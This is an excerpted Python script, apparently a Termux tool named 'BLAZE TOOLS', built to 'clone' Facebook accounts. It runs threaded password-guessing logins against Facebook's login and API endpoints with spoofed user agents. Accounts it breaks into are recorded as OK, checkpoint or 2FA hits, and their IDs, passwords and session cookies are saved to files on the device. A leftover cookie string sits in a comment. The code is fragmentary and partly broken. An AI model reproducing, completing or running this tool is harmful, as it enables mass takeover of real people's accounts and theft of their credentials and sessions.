...
try:
	...
	os.system('python bayadblaze.py')
os.system('git pull -q')
print(' [»] F O L L O W    O W N E R')
os.system('xdg-open https://facebook.com/groups/1774055946212186/')
input(' [»] P L E A S E   E N T E R')

try:
	ah = os.listdir('/sdcard')
	if ['Android'] in ah:pass
except:print(' \n please allow permission ');time.sleep(1);os.system('termux-setup-storage');exit()
...
def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FBIOS;FBAV/169.0.0.50.95;FBBV/96777264;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.5;FBSS/2;FBCR/MegaFon;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]"
...
\33[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[0;92m║           [ ENJOY CLONING ]                 \033[0;92m║
\33[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;95m[\033[1;93m[»]\033[1;95m]\033[1;93m TOOLS  \033[1;91m : \033[1;92mBLAZE TOOLS
 \033[1;95m[\033[1;93m[»]\033[1;95m]\033[1;93m OWNER\033[1;91m   : \033[1;92mUNO
 \033[1;95m[\033[1;93m[»]\033[1;95m]\033[1;93m GITHUB  \033[1;91m: \033[1;92mJoshhi1
 \033[1;95m[\033[1;93m[»]\033[1;95m]\033[1;93m TYPE   \033[1;91m : \033[1;92mFILE CLONING 
 \033[1;95m[\033[1;93m[»]\033[1;95m]\033[1;93m VERSION \033[1;91m: \033[1;92m4.0
 \33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)
def linex():
        print(' \33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		...
		#	os.system('xdg-open)
			if xd in ['1','01']:
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' \033[1;37mPlease use airplane mode every 3 minutes for speed up')
					linex()
					for user in fo:
				...
				exit(' Thanks for using blaze tools ')
			else:
...
def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BLAZE-RUNNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
    ...
    # 'cookie': 'datr=zxuAZndFp1JSrvAiIPj8pNNt; sb=zxuAZjKLbNleb7tr5OS8q1I2; locale=en_GB; ps_n=1; ps_l=1; wl_cbv=v2%3Bclient_version%3A2546%3Btimestamp%3A1719671886; vpd=v1%3B716x360x2; m_pixel_ratio=2; wd=360x716; fr=02PwVXoI7HkLAtTiI.AWU4-JGWBVbIW3rS3fC0XcBZxJY.BmgBvP..AAA.0.0.BmgK-d.AWV5HsUAZRg',
    'dpr': '2',
    ...
    'viewport-width': '980',
                        ...
                        url = 'https://free.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [BLAZE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/BLAZE-RANDOM-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BLAZE-RANDOM-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [BLAZE-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BLAZE-RANDOM-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [BLAZE-M2] %s|\033[1;32mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;36m [BLAZE-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/BLAZE-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BLAZE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[BLAZE-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                                        sys.stdout.write('\r\r\033[1;31m [BLAZE-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;32m [BLAZE-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BLAZE-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BLAZE-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;36m [BLAZE-M1] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [BLAZE-OK] %s | %s'%(ids,pas))
                                open('/sdcard/blaze-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/blaze-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [BLAZE-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/blaze-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
